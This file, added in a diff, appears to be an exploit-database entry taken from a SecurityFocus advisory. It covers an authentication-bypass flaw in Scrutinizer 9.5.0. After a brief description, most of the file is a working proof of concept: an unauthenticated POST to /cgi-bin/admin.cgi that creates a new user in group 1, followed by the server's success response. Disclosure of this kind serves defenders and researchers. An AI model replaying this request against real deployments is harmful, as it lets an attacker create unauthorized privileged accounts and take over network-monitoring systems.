@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/54727/info
+
+Scrutinizer is prone to an authentication-bypass vulnerability.
+
+Exploiting this issue may allow an attacker to bypass certain security restrictions and perform unauthorized actions.
+
+Scrutinizer 9.5.0 is vulnerable; other versions may also be affected. 
+
+#Request
+POST /cgi-bin/admin.cgi HTTP/1.1
+Host: 10.70.70.212
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:11.0) Gecko/20100101 Firefox/11.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Content-Length: 70
+
+tool=userprefs&newUser=trustwave&pwd=trustwave&selectedUserGroup=1
+
+#Response
+HTTP/1.1 200 OK
+Date: Wed, 25 Apr 2012 17:52:15 GMT
+Server: Apache
+Vary: Accept-Encoding
+Content-Length: 19
+Content-Type: text/html; charset=utf-8
+
+{"new_user_id":"2"}
+
